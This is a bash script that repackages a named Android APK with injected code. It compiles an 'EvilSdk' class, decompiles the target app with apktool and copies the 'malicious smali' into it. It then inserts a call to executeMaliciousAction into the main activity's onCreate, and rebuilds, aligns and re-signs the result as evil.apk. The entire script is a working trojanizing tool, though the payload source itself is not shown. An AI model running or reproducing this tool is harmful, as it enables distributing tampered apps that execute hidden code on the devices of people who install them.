#!/bin/bash
set -e

# Check arguments
if [ -z "$1" ]; then
    echo "Usage: $0 <package_name>"
    exit 1
fi

PACKAGE_NAME=$1

ANDROID_HOME=${ANDROID_HOME:-"~/Android/Sdk"}
ANDROID_JAR="$ANDROID_HOME/platforms/android-33/android.jar"
BUILD_TOOLS="$ANDROID_HOME/build-tools/33.0.3"
D8_CMD="$BUILD_TOOLS/d8"
ZIPALIGN_CMD="$BUILD_TOOLS/zipalign"
APKSIGNER_CMD="$BUILD_TOOLS/apksigner"

BAKSMALI_JAR="./baksmali.jar"
APK_SOURCE_DIR="../../../apks"
KEYSTORE="./my_keystore.jks"

# Working directories
WORK_DIR=$(pwd)
SDK_DIR="$WORK_DIR/Sdk"
APP_DIR="$WORK_DIR/app"

echo "[*] Starting verification and preparation..."

echo "    -> Compiling EvilSdk.java..."
if [ ! -d "$SDK_DIR" ]; then
    echo "Error: Sdk directory not found at $SDK_DIR"
    exit 1
fi

pushd "$SDK_DIR" > /dev/null

rm -rf evil classes.dex EvilSdk.class

javac -classpath "$ANDROID_JAR" ./EvilSdk.java
"$D8_CMD" ./*.class
java -jar "$BAKSMALI_JAR" d ./classes.dex -o evil
popd > /dev/null

echo "    -> Decompiling $PACKAGE_NAME.apk..."
rm -rf "$APP_DIR"
apktool d "$APK_SOURCE_DIR/$PACKAGE_NAME.apk" -o "$APP_DIR" -q

echo "[*] Starting code injection..."

echo "    -> Copying Malicious Smali..."
TARGET_SMALI_DIR="$APP_DIR/smali/exploit"
mkdir -p "$TARGET_SMALI_DIR"
find "$SDK_DIR/evil/exploit" -name "*.smali" -exec cp {} "$TARGET_SMALI_DIR/" \;

MANIFEST_FILE="$APP_DIR/AndroidManifest.xml"

if [ ! -f "$MANIFEST_FILE" ]; then
    echo "Error: AndroidManifest.xml not found!"
    exit 1
fi

# change extractNativeLibs to true in case it's false
if grep -q 'android:extractNativeLibs="false"' "$MANIFEST_FILE"; then
    echo "    -> Modifying extractNativeLibs to true..."
    sed -i 's/android:extractNativeLibs="false"/android:extractNativeLibs="true"/' "$MANIFEST_FILE"
fi

MAIN_ACTIVITY=$(python3 -c "
import xml.etree.ElementTree as ET
import sys

try:
    tree = ET.parse('$MANIFEST_FILE')
    root = tree.getroot()
    ns = {'android': 'http://schemas.android.com/apk/res/android'}
    package = root.get('package')
    
    found_activity = None
    
    # Iterate over all activities
    for activity in root.findall('./application/activity'):
        for intent_filter in activity.findall('intent-filter'):
            action = intent_filter.find(\"action[@android:name='android.intent.action.MAIN']\", ns)
            
            if action is not None:
                found_activity = activity.get('{http://schemas.android.com/apk/res/android}name')
                break
        if found_activity:
            break
            
    if found_activity:
        if found_activity.startswith('.'):
            print(f'{package}{found_activity}')
        elif '.' not in found_activity:
            print(f'{package}.{found_activity}')
        else:
            print(found_activity)
except Exception as e:
    pass
")

if [ -z "$MAIN_ACTIVITY" ]; then
    echo "Error: Could not determine Main Activity from AndroidManifest.xml"
    exit 1
fi

echo "       Found Main Activity: $MAIN_ACTIVITY"

# 2.3 Inject Code into onCreate
echo "    -> Injecting into onCreate..."
ID_PATH=$(echo "$MAIN_ACTIVITY" | sed 's/\./\//g')
ACTIVITY_SMALI="$APP_DIR/smali/$ID_PATH.smali"

if [ ! -f "$ACTIVITY_SMALI" ]; then
    # Start looking in other smali directories (smali_classes2, etc) if not in main smali
    # Use find to locate the file
    ACTIVITY_FILENAME=$(basename "$ID_PATH").smali
    FOUND_PATH=$(find "$APP_DIR" -name "$ACTIVITY_FILENAME" | grep "/$ID_PATH.smali" | head -n 1)
    
    if [ -n "$FOUND_PATH" ]; then
        ACTIVITY_SMALI="$FOUND_PATH"
        echo "       Located smali at: $ACTIVITY_SMALI"
    else
        echo "Error: Smali file for Main Activity ($ID_PATH.smali) not found."
        exit 1
    fi
fi

PAYLOAD="    invoke-static {p0}, Lexploit/EvilSdk;->executeMaliciousAction(Landroid/content/Context;)V"

if grep -q "EvilSdk;->executeMaliciousAction" "$ACTIVITY_SMALI"; then
    echo "       Warning: Payload seems to be already present. Skipping injection to avoid duplication."
else
    # sed command explanation:
    # 1. Range: Match start of onCreate method to end of method.
    # 2. Within that range, first match of .locals X, append payload after it.
    # Note: We need to be careful not to inject in every .locals if there are multiple (unlikely in one method).
    # Being specific: Match method line, then next .locals.
    
    # Using a temporary file for safety with complex sed
    temp_file=$(mktemp)
    
    awk -v payload="$PAYLOAD" '
        BEGIN { in_method = 0; injected = 0; }
        /\.method (protected|public) onCreate/ { in_method = 1; print; next; }
        /\.end method/ { in_method = 0; print; next; }
        in_method && !injected && /\.locals/ {
            print;
            print payload;
            injected = 1;
            next;
        }
        { print }
    ' "$ACTIVITY_SMALI" > "$temp_file"
    
    mv "$temp_file" "$ACTIVITY_SMALI"
    echo "       Injection complete."
fi

echo "[*] Reassembling and Signing..."

# 1 Build APK
echo "    -> Building APK..."
rm -f unsigned_apk.apk aligned.apk "$PACKAGE_NAME.apk"
apktool b "$APP_DIR" -o unsigned_apk.apk

# 2 Zipalign
echo "    -> Aligning APK..."
"$ZIPALIGN_CMD" -f -v 4 unsigned_apk.apk aligned.apk > /dev/null

# 3 Sign APK
echo "    -> Signing APK..."
"$APKSIGNER_CMD" sign --ks "$KEYSTORE" --ks-pass pass:123456 aligned.apk

# 4 Finalize
mv aligned.apk evil.apk
rm unsigned_apk.apk

rm -rrf "$APP_DIR"

echo "=============================================================================="
echo "[SUCCESS] Process completed. Output file: evil.apk"
echo "=============================================================================="
